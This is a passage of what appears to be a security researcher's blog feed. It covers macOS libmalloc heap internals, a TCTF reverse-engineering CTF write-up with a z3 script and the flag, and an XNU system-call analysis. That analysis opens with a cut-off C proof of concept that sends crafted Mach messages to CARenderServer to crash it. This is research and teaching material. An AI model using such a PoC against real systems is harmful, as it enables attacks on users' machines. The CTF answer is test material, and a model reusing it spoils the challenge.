be NULL. Present in version &gt;= 6.*/    void (* MALLOC_ZONE_FN_PTR(free_definite_size))(struct _malloc_zone_t *zone, void *ptr, size_t size);    /* Empty out caches in the face of memory pressure. The callback may be NULL. Present in version &gt;= 8. */    size_t     (* MALLOC_ZONE_FN_PTR(pressure_relief))(struct _malloc_zone_t *zone, size_t goal);    /*     * Checks whether an address might belong to the zone. May be NULL. Present in version &gt;= 10.     * False positives are allowed (e.g. the pointer was freed, or it&#39;s in zone space that has     * not yet been allocated. False negatives are not allowed.     */    boolean_t (* MALLOC_ZONE_FN_PTR(claimed_address))(struct _malloc_zone_t *zone, void *ptr);} malloc_zone_t;</code></pre><h5 id="rack-t-magazine-rack-h"><a href="#rack-t-magazine-rack-h" class="headerlink" title="rack_t // magazine_rack.h"></a>rack_t // magazine_rack.h</h5><pre><code class="c">typedef struct rack_s {    /* Regions for tiny objects */    _malloc_lock_s region_lock MALLOC_CACHE_ALIGN;    rack_type_t type;    size_t num_regions;    size_t num_regions_dealloc;    region_hash_generation_t *region_generation;    region_hash_generation_t rg[2];    region_t initial_regions[INITIAL_NUM_REGIONS];    int num_magazines;    unsigned num_magazines_mask;    int num_magazines_mask_shift;    uint32_t debug_flags;    // array of per-processor magazines    magazine_t *magazines;    uintptr_t cookie;    uintptr_t last_madvise;} rack_t;</code></pre><h5 id="magazine-t-magazine-zone-h"><a href="#magazine-t-magazine-zone-h" class="headerlink" title="magazine_t // magazine_zone.h"></a>magazine_t // magazine_zone.h</h5><pre><code class="c">typedef struct magazine_s { // vm_allocate()&#39;d, so the array of magazines is page-aligned to begin with.    // Take magazine_lock first,  Depot lock when needed for recirc, then szone-&gt;{tiny,small}_regions_lock when needed for alloc    _malloc_lock_s magazine_lock MALLOC_CACHE_ALIGN;    // Protection for the crtical section that does allocate_pages outside the magazine_lock    volatile boolean_t alloc_underway;    // One element deep &quot;death row&quot;, optimizes malloc/free/malloc for identical size.    void *mag_last_free;    msize_t mag_last_free_msize;    // msize for mag_last_free#if MALLOC_TARGET_64BIT    uint32_t _pad;#endif    region_t mag_last_free_rgn; // holds the region for mag_last_free    free_list_t mag_free_list[MAGAZINE_FREELIST_SLOTS];    uint32_t mag_bitmap[MAGAZINE_FREELIST_BITMAP_WORDS];    // the first and last free region in the last block are treated as big blocks in use that are not accounted for    size_t mag_bytes_free_at_end;    size_t mag_bytes_free_at_start;    region_t mag_last_region; // Valid iff mag_bytes_free_at_end || mag_bytes_free_at_start &gt; 0    // bean counting ...    size_t mag_num_bytes_in_objects;    size_t num_bytes_in_magazine;    unsigned mag_num_objects;    // recirculation list -- invariant: all regions owned by this magazine that meet the emptiness criteria    // are located nearer to the head of the list than any region that doesn&#39;t satisfy that criteria.    // Doubly linked list for efficient extraction.    unsigned recirculation_entries;    region_trailer_t *firstNode;    region_trailer_t *lastNode;#if MALLOC_TARGET_64BIT    uintptr_t pad[320 - 14 - MAGAZINE_FREELIST_SLOTS -            (MAGAZINE_FREELIST_BITMAP_WORDS + 1) / 2];#else    uintptr_t pad[320 - 16 - MAGAZINE_FREELIST_SLOTS -            MAGAZINE_FREELIST_BITMAP_WORDS];#endif} magazine_t;</code></pre><h5 id="tiny-region-t-magazine-zone-h"><a href="#tiny-region-t-magazine-zone-h" class="headerlink" title="tiny_region_t //magazine_zone.h"></a>tiny_region_t //magazine_zone.h</h5><pre><code class="c">/* * Layout of a tiny region */typedef uint32_t tiny_block_t[4]; // assert(TINY_QUANTUM == sizeof(tiny_block_t))typedef struct tiny_header_inuse_pair {    uint32_t header;    uint32_t inuse;} tiny_header_inuse_pair_t;typedef struct region_trailer {    struct region_trailer *prev;    struct region_trailer *next;    boolean_t recirc_suitable;    volatile int pinned_to_depot;    unsigned bytes_used;    mag_index_t mag_index;} region_trailer_t;#define NUM_TINY_BLOCKS 64520typedef struct tiny_region {    tiny_block_t blocks[NUM_TINY_BLOCKS];    region_trailer_t trailer;    // The interleaved bit arrays comprising the header and inuse bitfields.    // The unused bits of each component in the last pair will be initialized to sentinel values.    tiny_header_inuse_pair_t pairs[CEIL_NUM_TINY_BLOCKS_WORDS];    uint8_t pad[TINY_REGION_SIZE - (NUM_TINY_BLOCKS * sizeof(tiny_block_t)) - TINY_METADATA_SIZE];} * tiny_region_t;</code></pre><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><ul><li><p><a href="http://phrack.org/issues/63/5.html" target="_blank" rel="external">http://phrack.org/issues/63/5.html</a></p></li><li><p><a href="https://www.synacktiv.com/ressources/Sthack_2018_Heapple_Pie.pdf" target="_blank" rel="external">https://www.synacktiv.com/ressources/Sthack_2018_Heapple_Pie.pdf</a></p></li><li><p><a href="https://papers.put.as/papers/macosx/2016/Summercon-2016.pdf" target="_blank" rel="external">https://papers.put.as/papers/macosx/2016/Summercon-2016.pdf</a></p></li><li><p><a href="https://www.cocoawithlove.com/2010/05/look-at-how-malloc-works-on-mac.html" target="_blank" rel="external">https://www.cocoawithlove.com/2010/05/look-at-how-malloc-works-on-mac.html</a></p></li><li><p>&lt;&lt;<a href="https://repo.zenk-security.com/Magazine%20E-book/The%20Mac%20Hacker&#39;s%20Handbook.pdf" target="_blank" rel="external">the Mac Hacker’s Handbook</a>&gt;&gt; 第8章Exploiting Heap Overflows</p></li><li><p><a href="https://opensource.apple.com/source/libmalloc/" target="_blank" rel="external">https://opensource.apple.com/source/libmalloc/</a> 源代码</p></li><li><p><a href="http://www.mindfiresolutions.com/mindfire/Mac_Memory_Manager.pdf" target="_blank" rel="external">http://www.mindfiresolutions.com/mindfire/Mac_Memory_Manager.pdf</a></p></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;源码解读macOS-iOS-Heap&quot;&gt;&lt;a href=&quot;#源码解读macOS-iOS-Heap&quot; class=&quot;headerlink&quot; title=&quot;源码解读macOS/iOS Heap&quot;&gt;&lt;/a&gt;源码解读macOS/iOS Heap&lt;/h3&gt;&lt;blockquo
      
    
    </summary>
    
      <category term="OS" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/OS/"/>
    
    
      <category term="heap" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/heap/"/>
    
  </entry>
  
  <entry>
    <title>TCTF-Elements</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/03/27/TCTF-Elements/TCTF-Elements/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/03/27/TCTF-Elements/TCTF-Elements/</id>
    <published>2019-03-27T07:13:30.000Z</published>
    <updated>2019-03-28T07:06:17.336Z</updated>
    
    <content type="html"><![CDATA[<h4 id="TCTF-Elements"><a href="#TCTF-Elements" class="headerlink" title="TCTF-Elements"></a>TCTF-Elements</h4><blockquote><p>这道题其实是一个数学问题，当时没有做出来，解题过程中走了很多弯路，踩了很多坑，不过也补了很多知识。</p></blockquote><h4 id="Elements"><a href="#Elements" class="headerlink" title="Elements"></a>Elements</h4><p>下面是main函数伪代码</p><pre><code class="c">signed __int64 __fastcall main(__int64 a1, char **a2, char **a3){  char v3; // bl  const __int32_t **v4; // rax  char *v5; // rcx  size_t v6; // rcx  signed __int64 result; // rax  char *v8; // r12  signed __int64 v9; // r14  char v10; // bl  signed __int64 v11; // rax  const unsigned __int16 *v12; // rcx  signed __int64 v13; // rdx  __int64 v14; // rsi  unsigned __int16 v15; // bx  signed __int64 v16; // rsi  __m128i v17; // xmm0  char *v18; // rax  double v19; // xmm2_8  double v20; // xmm0_8  double v21; // xmm2_8  double v22; // xmm3_8  double v23; // [rsp+20h] [rbp-148h]  double v24; // [rsp+28h] [rbp-140h]  double v25; // [rsp+30h] [rbp-138h]  char s[8]; // [rsp+40h] [rbp-128h]  char v27; // [rsp+6Bh] [rbp-FDh]  fgets(s, 256, stdin);  v3 = s[0];  if ( s[0] )  {    v4 = __ctype_tolower_loc();    v5 = &amp;s[1];    do    {      *(v5 - 1) = (*v4)[v3];      v3 = *v5++;    }    while ( v3 );  }  v6 = strlen(s);  result = 0LL;  if ( v6 &gt;= 0x2C &amp;&amp; (*(_QWORD *)s &amp; 0xFFFFFFFFFFLL) == 530015415398LL &amp;&amp; v27 == 125 )  {    v27 = 0;    v8 = strtok(&amp;s[5], &quot;-&quot;);    v9 = 0LL;    if ( v8 )    {      while ( strlen(v8) == 12 )      {        v10 = *v8;        v11 = 0LL;        if ( *v8 )        {          v12 = *__ctype_b_loc();          v13 = 1LL;          v11 = 0LL;          do          {            v14 = v10;            v15 = v12[v10];            if ( (char)v14 &lt;= 102 &amp;&amp; v15 &amp; 0x400 )            {              v16 = v14 - 87;            }            else            {              if ( !(v15 &amp; 0x800) )                goto LABEL_31;              v16 = v14 - 48;            }            v11 = v16 | 16 * v11;            if ( v13 &gt; 11 )              break;            v10 = v8[v13++];          }          while ( v10 );        }        if ( !v9 &amp;&amp; v11 != 62791383142154LL )          break;        v17 = (__m128i)_mm_sub_pd(                         (__m128d)_mm_unpacklo_epi32((__m128i)(unsigned __int64)v11, (__m128i)xmmword_400BD0),                         (__m128d)xmmword_400BE0);        *(&amp;v23 + v9++) = COERCE_DOUBLE(_mm_shuffle_epi32(v17, 78)) + *(double *)v17.m128i_i64;        v18 = strtok(0LL, &quot;-&quot;);        v8 = v18;        if ( v9 &gt; 2 || !v18 )        {          if ( v24 &lt;= v23 || v25 &lt;= v24 || v23 + v24 &lt;= v25 )            break;          v19 = v24 * v24 + v23 * v23 - v25 * v25;          v20 = sqrt(4.0 * v23 * v23 * v24 * v24 - v19 * v19) * 0.25;          v21 = (v20 + v20) / (v23 + v24 + v25) + -1.940035480806554e13;          if ( v21 &lt; 0.00001 &amp;&amp; v21 &gt; -0.00001 )          {            v22 = v23 * v24 * v25 / (v20 * 4.0) + -4.777053952827391e13;            if ( v22 &lt; 0.00001 &amp;&amp; v22 &gt; -0.00001 )              puts(&quot;Congratz, input is your flag&quot;);          }          return 0LL;        }      }    }LABEL_31:    result = 0xFFFFFFFFLL;  }  return result;}</code></pre><p>这个题整个逻辑很清晰，前面一部分对输入的字符串做了一些格式和字符数量判断。</p><p>分析可得到需要输入以下格式<code>flag{xxxxxxxxxxxx-xxxxxxxxxxxx-xxxxxxxxxxxx}</code></p><p>这里通过<code>-</code>分割成三个部分，其中第一部分是已知的<code>391bc2164f0a</code>，后面就是程序验证逻辑</p><pre><code class="c">          if ( v24 &lt;= v23 || v25 &lt;= v24 || v23 + v24 &lt;= v25 )            break;          v19 = v24 * v24 + v23 * v23 - v25 * v25;          v20 = sqrt(4.0 * v23 * v23 * v24 * v24 - v19 * v19) * 0.25;          v21 = (v20 + v20) / (v23 + v24 + v25) + -1.940035480806554e13;          if ( v21 &lt; 0.00001 &amp;&amp; v21 &gt; -0.00001 )          {            v22 = v23 * v24 * v25 / (v20 * 4.0) + -4.777053952827391e13;            if ( v22 &lt; 0.00001 &amp;&amp; v22 &gt; -0.00001 )              puts(&quot;Congratz, input is your flag&quot;);          }</code></pre><p>当时一看其实就知道是一个三角形相关的运算，整理可得以下表达式</p><p>$c&gt;b,b&gt;a,a+b&gt;c$</p><p>$p=\frac{\sqrt{4a^2b^2-(a^2+b^2-c^2)^2)}}{2(a+b+c)}-1.940035480806554e13$</p><p>$q=\frac{abc}{(\sqrt{4a^2b^2-(a^2+b^2-c^2)^2})}-4.777053952827391e13$</p><p>$-0.00001&lt;p&lt;0.00001,-0.00001&lt;q&lt;0.00001 $</p><p>但并没有看出来是三角形内外圆的半径公式，所以想着直接上约束求解器z3</p><pre><code class="python">from z3 import *x = Real(&#39;x&#39;)y = Real(&#39;y&#39;)z = Real(&#39;z&#39;)m = Real(&#39;m&#39;)n = Real(&#39;n&#39;)p = Real(&#39;p&#39;)q = Real(&#39;q&#39;)solver = Solver()m = x*x+y*y-z*zn = (4.0*x*x*y*y-m*m)**0.5*0.25p = 2*n/(x+y+z) + (-1.940035480806554296875E13)q = x*y*z/(4.0*n) + (-4.777053952827391e13)solver.add(z &gt; y)solver.add(y &gt; x)solver.add(x + y &gt; z)solver.add(p &gt; -100,p&lt;100)solver.add(q &gt; -100,q&lt;100)solver.add(x == 6.2791383142154e13)if solver.check() == sat:    print(solver.model())else:    print(&#39;unsolve&#39;)</code></pre><p>结果求解了很久z3解不出来，后来才知道z3不能求解该类问题。z3文档中有提及只能解决非线性多项式约束，导致花了很长时间在思考是不是脚本的问题。然后用wolframalpha去求解也没有结果（目前还不清楚原因</p><p>下来思考了很久才知道是求解三角形的内外半径，通过内外圆的性质得到如下公式</p><p>$$Rr=\frac{abc}{2(a+b+c)}$$</p><p>$$tan\frac{C}{2} = \frac{2r}{a+b-c} = \frac{sinC}{1+cosC}$$</p><p>这里$sinC,cosC,R,r,c$都是已知的</p><p>所以联立能得到$$a=7.0802074077033E13,b=9.5523798483318E13 $$</p><p>得到对应的浮点数表示4064e4798769,56e0de138176</p><pre><code class="assembly">movq    xmm0, raxpunpckldq xmm0, xmmword ptr cs:qword_400BD0subpd   xmm0, cs:xmmword_400BE0pshufd  xmm1, xmm0, 4Ehaddpd   xmm1, xmm0movlpd  [rsp+r14*8+168h+var_148], xmm1</code></pre><p>在这里需要逆向求解出rax的值，即flag后面两部分。刚开始在这里卡了一下，感觉求解不出来。后面观察到qword_400BD0和xmmword_400BE0这两个数十分特殊</p><pre><code>qword_400BD0=0x4530000043300000xmmword_400BE0=0x45300000000000004330000000000000</code></pre><p>punpckldq指令会将qword_400BD0和rax分成两部分组合，这里恰好qword_400BD0为浮点数的阶数部分，rax为尾数部分</p><p>然后再分别与4530000000000000，4330000000000000相减。特殊在于这两个数阶数和上面对应相等，尾数部分为0，倒是相减结果又变回原始值。</p><p>所以其实这里的变换等于没有变换。</p><p>所以三个边长分别等于391bc2164f0a,4064e4798769,56e0de138176</p><p>最后的flag=flag{391bc2164f0a-4064e4798769-56e0de138176}</p><h4 id="补充：浮点数表示、运算、指令"><a href="#补充：浮点数表示、运算、指令" class="headerlink" title="补充：浮点数表示、运算、指令"></a>补充：浮点数表示、运算、指令</h4><p>浮点数有单精度和双精度之分，float占4个字节，double占8个字节</p><p>在表示小数的时候采用类比科学计数法的方法，把二进制小数转换为2为底的指数表示$V=(-1)^s<em>M</em>2^E$</p><p>e等于向左或向右移动到1为止的个数</p><p>比如：12.25   对应二进制：1100.01 这里需要向右移动三位$1.10001*2^3$</p><p>下面以float表示12.25这个数，分为三部分，符号位（1位）、指数（8位）、尾数（23位）</p><p>符号位0，指数3，尾数10001(第一位默认为1不需要表示)</p><p>由于指数也有负指数，所以其实还需要一位表示符号位， IEEE规定，小于01111111的指数位为负数</p><p>其实这里可以理解为首位表示符号位，这样的话采用如下计算出float指数部分表示<code>10000000+11-1=10000010</code></p><p>最后12.15单精度浮点数表示为：<code>0 10000010 10001000000000000000000</code> </p><p>十六进制：<code>0x41440000</code> 内存中小端表示：<code>00 00 44 41</code></p><table><thead><tr><th style="text-align:center">Float/Double</th><th style="text-align:center">符号位</th><th style="text-align:center">指数</th><th style="text-align:center">尾数</th><th style="text-align:left">示例</th><th style="text-align:left">16进制</th></tr></thead><tbody><tr><td style="text-align:center">Float</td><td style="text-align:center">1位</td><td style="text-align:center">8位</td><td style="text-align:center">23位</td><td style="text-align:left">0 10000010 10001000000000000000000</td><td style="text-align:left">41440000</td></tr><tr><td style="text-align:center">Double</td><td style="text-align:center">1位</td><td style="text-align:center">11位</td><td style="text-align:center">52位</td><td style="text-align:left">0 10000000010 1000100000000000000000000000 000000000000000000000000</td><td style="text-align:left">4028800000000000</td></tr></tbody></table><p>特殊的数表示：当全指数尾数全为0时，表示最小的数，这里定义为0；当指数全为1，尾数全为0时，表示最大的数，这里定义为无穷。</p><p>在线转换<a href="http://www.binaryconvert.com/" target="_blank" rel="external">http://www.binaryconvert.com/</a> </p><p>浮点数在进行加减运算的时候需要先对阶然后尾数部分运算</p><p>浮点数指令查询<a href="https://asm.inightmare.org/opcodelst/index.php" target="_blank" rel="external">https://asm.inightmare.org/opcodelst/index.php</a></p><p>这里解释下<code>pshufd  xmm1, xmm0, 4Eh</code>指令</p><p><code>pshufd</code>可以按照指定的方式重新排列数据</p><p>这里4E二进制<code>01 00 11 10</code></p><table><thead><tr><th>寄存器</th><th>值</th></tr></thead><tbody><tr><td>xmm0</td><td>42cc8d80 00000000 41e842c9 e1400000</td></tr><tr><td>4E</td><td>01               00                 11               10</td></tr><tr><td>xmm1</td><td>41e842c9 e1400000 42cc8d80 00000000</td></tr></tbody></table>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;TCTF-Elements&quot;&gt;&lt;a href=&quot;#TCTF-Elements&quot; class=&quot;headerlink&quot; title=&quot;TCTF-Elements&quot;&gt;&lt;/a&gt;TCTF-Elements&lt;/h4&gt;&lt;blockquote&gt;
&lt;p&gt;这道题其实是一个数学问题，
      
    
    </summary>
    
      <category term="ctf" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/ctf/"/>
    
    
      <category term="re" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/re/"/>
    
      <category term="tctf" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/tctf/"/>
    
  </entry>
  
  <entry>
    <title>idapython learning note</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/03/07/idapython-learning-note/idapython-learning-note/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/03/07/idapython-learning-note/idapython-learning-note/</id>
    <published>2019-03-07T11:42:24.000Z</published>
    <updated>2019-05-29T06:58:29.917Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="IDA" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/IDA/"/>
    
    
  </entry>
  
  <entry>
    <title>1amb4ck</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/03/05/1amb4ck/1amb4ck/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/03/05/1amb4ck/1amb4ck/</id>
    <published>2019-03-05T15:26:30.000Z</published>
    <updated>2019-03-06T02:47:23.041Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none">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</div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Welcome to my blog, enter password to read.
    
    </summary>
    
      <category term="me" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/me/"/>
    
    
  </entry>
  
  <entry>
    <title>XNU系统调用深度解析</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/01/30/XNU%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90/XNU%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/01/30/XNU系统调用深度解析/XNU系统调用深度解析/</id>
    <published>2019-01-30T05:53:00.000Z</published>
    <updated>2019-03-05T15:30:52.474Z</updated>
    
    <content type="html"><![CDATA[<h3 id="XNU系统调用深度解析"><a href="#XNU系统调用深度解析" class="headerlink" title="XNU系统调用深度解析"></a>XNU系统调用深度解析</h3><blockquote><p>从一个函数分析到系统调用的内核实现</p></blockquote><h4 id="由一段POC而起"><a href="#由一段POC而起" class="headerlink" title="由一段POC而起"></a>由一段POC而起</h4><pre><code class="c">#include &lt;stdio.h&gt;#include &lt;mach/i386/kern_return.h&gt;#include &lt;mach/mach_traps.h&gt;#include &lt;servers/bootstrap.h&gt;#include &lt;dirent.h&gt;#include &lt;sys/stat.h&gt;#include &lt;time.h&gt;#include &lt;dlfcn.h&gt;#include &lt;unistd.h&gt;typedef struct quartz_register_client_s quartz_register_client_t;struct quartz_register_client_s {        mach_msg_header_t header;        uint32_t body;        mach_msg_port_descriptor_t ports[4];        char padding[12];};typedef struct quartzcore_mach_msg quartzcore_mach_msg_t;struct quartzcore_mach_msg{        mach_msg_header_t header;        char msg_body[712];};uint64_t get_filesize(const char *fn){        struct stat st;        stat(fn, &amp;st);        uint64_t fsize = st.st_size;        return fsize;};int main(int argc, const char * argv[]) {        mach_port_t p = MACH_PORT_NULL, bs_port = MACH_PORT_NULL;        task_get_bootstrap_port(mach_task_self(), &amp;bs_port);        const char *render_service_name = &quot;com.apple.CARenderServer&quot;;        kern_return_t (*bootstrap_look_up)(mach_port_t, const char *, mach_port_t *) = dlsym(RTLD_DEFAULT, &quot;bootstrap_look_up&quot;);        kern_return_t kr = bootstrap_look_up(bs_port, render_service_name, &amp;p);        if (kr != KERN_SUCCESS) {                return -1;        }        printf(&quot;[*] Get service of %s successully!\n&quot;, render_service_name);        quartz_register_client_t msg_register;        memset(&amp;msg_register, 0, sizeof(msg_register));        msg_register.header.msgh_bits =        MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE) |        MACH_MSGH_BITS_COMPLEX;        msg_register.header.msgh_remote_port = p;        msg_register.header.msgh_local_port = mig_get_reply_port();        msg_register.header.msgh_id = 40202;  // _XRegisterClient        msg_register.body = 4;        msg_register.ports[0].name = mach_task_self();        msg_register.ports[0].disposition = MACH_MSG_TYPE_COPY_SEND;        msg_register.ports[0].type = MACH_MSG_PORT_DESCRIPTOR;        msg_register.ports[1].name = mach_task_self();        msg_register.ports[1].disposition = MACH_MSG_TYPE_COPY_SEND;        msg_register.ports[1].type = MACH_MSG_PORT_DESCRIPTOR;        msg_register.ports[2].name = mach_task_self();        msg_register.ports[2].disposition = MACH_MSG_TYPE_COPY_SEND;        msg_register.ports[2].type = MACH_MSG_PORT_DESCRIPTOR;        msg_register.ports[3].name = mach_task_self();        msg_register.ports[3].disposition = MACH_MSG_TYPE_COPY_SEND;        msg_register.ports[3].type = MACH_MSG_PORT_DESCRIPTOR;        kr = mach_msg(&amp;msg_register.header, MACH_SEND_MSG | MACH_RCV_MSG,                                    sizeof(quartz_register_client_t), sizeof(quartz_register_client_t),                                    msg_register.header.msgh_local_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);        if (kr != KERN_SUCCESS) {                return -1 ;        }        mach_port_t context_port = *(uint32_t *)((uint8_t *)&amp;msg_register + 0x1c);        uint32_t conn_id = *(uint32_t *)((uint8_t *)&amp;msg_register + 0x30);        printf(&quot;[*] context_port: 0x%x, conn_id: 0x%x\n&quot;,context_port,conn_id);        char *crash_log = &quot;crash.data&quot;; //size is 736.        FILE *fp = fopen(crash_log, &quot;rb&quot;);        if(fp == NULL){                printf(&quot;fopen error!\n&quot;);        }        uint64_t fsize = get_filesize(crash_log);        void *msg_buf = malloc(fsize);        memset(msg_buf, 0, fsize);        fread(msg_buf, fsize, 1, fp);        quartzcore_mach_msg_t qc_mach_msg = {0};        qc_mach_msg.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0) | MACH_MSGH_BITS_COMPLEX;        qc_mach_msg.header.msgh_remote_port = context_port;        qc_mach_msg.header.msgh_id = 40002;        memset(qc_mach_msg.msg_body, 0x0, sizeof(qc_mach_msg.msg_body));        *(uint32_t *)(qc_mach_msg.msg_body + 0) = 0x1;  // Ports count        memcpy(qc_mach_msg.msg_body+4+12, msg_buf+0x1c+0xc, 736-0x1c-0xc);        *(uint32_t *)(qc_mach_msg.msg_body + 4 + 12 + 4) = conn_id;        kr = mach_msg(&amp;qc_mach_msg.header, MACH_SEND_MSG,736, 0, 0, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);        if (kr != KERN_SUCCESS) {                printf(&quot;[-] 